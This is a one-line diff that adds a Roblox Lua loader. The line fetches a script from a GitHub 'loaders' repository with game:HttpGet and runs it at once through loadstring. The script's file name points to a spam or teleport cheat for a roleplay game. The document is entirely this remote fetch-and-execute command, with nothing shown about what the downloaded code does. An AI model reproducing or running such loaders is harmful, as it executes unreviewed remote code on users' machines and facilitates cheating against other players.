@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/lifetogether-rp-families-spam5-tp3puyvgm7j6pa.lua"))()
